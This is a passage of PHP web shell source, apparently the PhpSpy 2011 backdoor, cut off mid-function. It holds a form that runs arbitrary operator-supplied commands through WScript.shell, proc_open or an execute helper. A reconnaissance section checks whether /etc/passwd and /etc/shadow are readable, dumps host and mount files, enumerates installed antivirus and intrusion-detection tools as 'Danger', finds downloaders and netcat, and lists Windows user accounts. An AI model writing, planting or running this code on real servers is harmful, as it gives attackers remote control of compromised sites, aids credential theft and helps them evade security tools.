<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Execute Command'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','shell');
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (IS_WIN &amp;&amp; IS_COM) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $execfuncdb = array('phpfunc'=&gt;'phpfunc','wscript'=&gt;'wscript','proc_open<span style="text-decoration: underline;">'=&gt;'proc_open');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makeselect(array('title'=&gt;'Use:','name'=&gt;'execfunc','option'=&gt;$execfuncd<span style="text-decoration: underline;">b,'selected'=&gt;$execfunc,'newline'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('title'=&gt;'Command','name'=&gt;'command','value'=&gt;htmlspecialcha<span style="text-decoration: underline;">rs($command)));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'Ex<span style="text-decoration: underline;">ecute'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();

<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($command) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;hr width="100%" noshade /&gt;&lt;pre&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($execfunc=='wscript' &amp;&amp; IS_WIN &amp;&amp; IS_COM) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $wsh = new COM('WScript.shell');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $exec = $wsh-&gt;exec('cmd.exe /c '.$command);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $stdout = $exec-&gt;StdOut();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $stroutput = $stdout-&gt;ReadAll();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo $stroutput;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif ($execfunc=='proc_open' &amp;&amp; IS_WIN &amp;&amp; IS_COM) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $descriptorspec = array(
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  0 =&gt; array('pipe', 'r'),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  1 =&gt; array('pipe', 'w'),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  2 =&gt; array('pipe', 'w')
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   );
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (is_resource($process)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fwrite($pipes[0], $command."\r\n");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fwrite($pipes[0], "exit\r\n");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fclose($pipes[0]);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while (!feof($pipes[1])) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo fgets($pipes[1], 1024);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fclose($pipes[1]);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while (!feof($pipes[2])) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo fgets($pipes[2], 1024);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fclose($pipes[2]);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   proc_close($process);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo(execute($command));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/pre&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}//end shell

elseif ($action == 'phpenv') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowe<span style="text-decoration: underline;">d';</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getc<span style="text-decoration: underline;">fg('sendmail_from');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$dis_func &amp;&amp; $dis_func = 'No';<span style="color: #de935f; background-color: #373b41;">     </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $info = array(
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   1 =&gt; array('Server Time',date('Y/m/d h:i:s',$timestamp)),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   2 =&gt; array('Server Domain',$_SERVER['SERVER_NAME']),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   3 =&gt; array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   4 =&gt; array('Server OS',PHP_OS),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   5 =&gt; array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   6 =&gt; array('Server Software',$_SERVER['SERVER_SOFTWARE']),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   7 =&gt; array('Server Web Port',$_SERVER['SERVER_PORT']),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   8 =&gt; array('PHP run mode',strtoupper(php_sapi_name())),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   9 =&gt; array('The file path',__FILE__),

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   10 =&gt; array('PHP Version',PHP_VERSION),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   11 =&gt; array('PHPINFO',(IS_PHPINFO ? '&lt;a href="javascript:g(\'phpinfo\');<span style="text-decoration: underline;">"&gt;Yes&lt;/a&gt;' : 'No')),</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   12 =&gt; array('Safe Mode',getcfg('safe_mode')),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   13 =&gt; array('Administrator',$adminmail),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   14 =&gt; array('allow_url_fopen',getcfg('allow_url_fopen')),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   15 =&gt; array('enable_dl',getcfg('enable_dl')),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   16 =&gt; array('display_errors',getcfg('display_errors')),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   17 =&gt; array('register_globals',getcfg('register_globals')),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   18 =&gt; array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   19 =&gt; array('memory_limit',getcfg('memory_limit')),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   20 =&gt; array('post_max_size',getcfg('post_max_size')),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   21 =&gt; array('upload_max_filesize',$upsize),
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   22 =&gt; array('max_execution_time',getcfg('max_execution_time').' second(s<span style="text-decoration: underline;">)'),</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   23 =&gt; array('disable_functions',$dis_func),
<span style="color: #969896; background-color: #1d1f21;"> </span>   );

<span style="color: #969896; background-color: #1d1f21;"> </span>   if($phpvarname) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m($phpvarname .' : '.getcfg($phpvarname));
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'Server environment'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','phpenv');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('title'=&gt;'Please input PHP configuration parameter(eg:magic_<span style="text-decoration: underline;">quotes_gpc)','name'=&gt;'phpvarname','value'=&gt;$phpvarname,'newline'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfooter();

<span style="color: #969896; background-color: #1d1f21;"> </span>   $hp = array(0=&gt; 'Server', 1=&gt; 'PHP');
<span style="color: #969896; background-color: #1d1f21;"> </span>   for($a=0;$a&lt;2;$a++) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;'.$hp[$a].' &amp;raquo;&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;ul class="info"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($a==0) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   for($i=1;$i&lt;=9;$i++) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } elseif ($a == 1) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   for($i=10;$i&lt;=23;$i++) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/ul&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}//end phpenv

elseif ($action == 'secinfo') {

<span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Server software', @getenv('SERVER_SOFTWARE'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS[<span style="text-decoration: underline;">'disable_functions']:'none');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Open base dir', @ini_get('open_basedir'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('cURL support', function_exists('curl_version')?'enabled':'no');
<span style="color: #969896; background-color: #1d1f21;"> </span>   $temp=array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(function_exists('mysql_get_client_info'))
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $temp[] = "MySql (".mysql_get_client_info().")";
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(function_exists('mssql_connect'))
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $temp[] = "MSSQL";
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(function_exists('pg_connect'))
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $temp[] = "PostgreSQL";
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(function_exists('oci_connect'))
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $temp[] = "Oracle";
<span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Supported databases', implode(', ', $temp));

<span style="color: #969896; background-color: #1d1f21;"> </span>   if( !IS_WIN ) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $userful = array('gcc','lcc','cc','ld','make','php','perl','python','rub<span style="text-decoration: underline;">y','tar','gzip','bzip','bzip2','nc','locate','suidperl');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd',<span style="text-decoration: underline;">'rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mir<span style="text-decoration: underline;">ror');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes" : '<span style="text-decoration: underline;">no');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes" : '<span style="text-decoration: underline;">no');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('OS version', @file_get_contents('/proc/version'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Distr name', @file_get_contents('/etc/issue.net'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $safe_mode = @ini_get('safe_mode');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(!$GLOBALS['safe_mode']) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $temp=array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($userful as $item)
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(which($item)){$temp[]=$item;}
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Userful', implode(', ',$temp));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $temp=array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($danger as $item)
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(which($item)){$temp[]=$item;}
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Danger', implode(', ',$temp));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $temp=array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($downloaders as $item)<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(which($item)){$temp[]=$item;}
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Downloaders', implode(', ',$temp));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Hosts', @file_get_contents('/etc/hosts'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('HDD space', execute('df -h'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Mount options', @file_get_contents('/etc/fstab'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('OS Version',execute('ver'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('Account Settings',execute('net accounts'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('User Accounts',execute('net user'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   secparam('IP Configurate',execute('ipconfig -all'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}//end

else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   m('Undefined Action');
}

?&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;<span style="text-decoration: underline;">background:#eee;"&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;span style="float:right;"&gt;&lt;?php debuginfo();ob_end_flush();?&gt;&lt;/span&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   Powered by &lt;a title="Build 20110502" href="http://www.4ngel.net" target="_bl<span style="text-decoration: underline;">ank"&gt;&lt;?php echo str_replace('.','','P.h.p.S.p.y');?&gt; 2011&lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href="http://www.4ngel.net" target="_blank"&gt;Security Angel Team [S4T]&lt;/a&gt; All Rights Reserved.</span>
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php

/*======================================================
&#20989;&#25968;&#24211;
======================================================*/

function secparam($n, $v) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $v = trim($v);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($v) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;'.$n.' &amp;raquo;&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;div class="infolist"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(strpos($v, "\n") === false)
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p($v.'&lt;br /&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   else
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;pre&gt;'.$v.'&lt;/pre&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/div&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}
function m($msg) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   echo '&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px s<span style="text-decoration: underline;">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;';</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   echo $msg;
<span style="color: #969896; background-color: #1d1f21;"> </span>   echo '&lt;/div&gt;';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookie<span style="text-decoration: underline;">life;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $key = ($prefix ? $cookiepre : '').$key;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $life = $life ? $life : $cookielife;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $usepo<span style="text-decoration: underline;">rt);</span>
}<span style="color: #de935f; background-color: #373b41;">   </span>
function multi($num, $perpage, $curpage, $tablename) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $multipage = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($num &gt; $perpage) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $page = 10;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $offset = 5;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $pages = @ceil($num / $perpage);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($page &gt; $pages) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $from = 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $to = $pages;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $from = $curpage - $offset;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $to = $curpage + $page - $offset - 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if($from &lt; 1) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $to = $curpage + 1 - $from;
